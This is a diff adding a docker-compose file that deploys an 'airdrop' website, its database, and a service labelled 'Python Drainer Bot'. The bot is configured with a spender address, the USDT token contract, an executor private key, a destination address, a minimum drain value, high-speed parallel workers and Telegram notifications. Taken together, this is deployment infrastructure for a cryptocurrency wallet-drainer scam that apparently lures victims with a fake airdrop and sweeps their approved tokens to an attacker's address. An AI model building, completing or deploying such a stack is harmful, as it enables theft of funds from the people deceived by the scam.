@@ -1,0 +1,77 @@
+services:
+
+  # ── PostgreSQL Database ──────────────────────────────────────────
+  db:
+    image: postgres:16-alpine
+    restart: unless-stopped
+    environment:
+      POSTGRES_DB: airdrop
+      POSTGRES_USER: airdrop
+      POSTGRES_PASSWORD: ${DB_PASSWORD}
+    volumes:
+      - pgdata:/var/lib/postgresql/data
+    networks:
+      - app-net
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U airdrop"]
+      interval: 5s
+      timeout: 5s
+      retries: 10
+
+  # ── API Server (Node.js / Express) ───────────────────────────────
+  # nginx روی سرور به port 8080 این سرویس پروکسی می‌کنه
+  api:
+    build:
+      context: ..
+      dockerfile: deploy/Dockerfile.api
+    restart: unless-stopped
+    ports:
+      - "127.0.0.1:8080:8080"
+    environment:
+      NODE_ENV: production
+      PORT: "8080"
+      DATABASE_URL: postgresql://airdrop:${DB_PASSWORD}@db:5432/airdrop
+      SESSION_SECRET: ${SESSION_SECRET}
+      SPENDER_ADDRESS: ${SPENDER_ADDRESS}
+      TOKEN_ADDRESS: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
+    depends_on:
+      db:
+        condition: service_healthy
+    networks:
+      - app-net
+
+  # ── Python Drainer Bot ───────────────────────────────────────────
+  bot:
+    build:
+      context: ..
+      dockerfile: deploy/Dockerfile.bot
+    restart: unless-stopped
+    environment:
+      WEBSITE_URL: http://api:8080
+      ENABLE_WEBSITE_MODE: "true"
+      ENABLE_POLLING: "true"
+      ENABLE_WEBHOOK: "false"
+      WEBSITE_POLL_INTERVAL: "1.0"
+      EXECUTOR_PRIVATE_KEY: ${EXECUTOR_PRIVATE_KEY}
+      DESTINATION_ADDRESS: ${DESTINATION_ADDRESS}
+      RPC_URL: ${RPC_URL:-https://eth.llamarpc.com}
+      CHAIN_ID: "1"
+      NETWORK: "ethereum"
+      ENABLE_EXECUTION: "true"
+      EXTREME_SPEED_MODE: "true"
+      MAX_WORKERS: "16"
+      MIN_DRAIN_VALUE: "0.1"
+      ENABLE_FLASHBOTS: "false"
+      TELEGRAM_BOT_TOKEN: ${TELEGRAM_BOT_TOKEN}
+      TELEGRAM_CHAT_ID: ${TELEGRAM_CHAT_ID}
+    depends_on:
+      - api
+    networks:
+      - app-net
+
+volumes:
+  pgdata:
+
+networks:
+  app-net:
+    driver: bridge
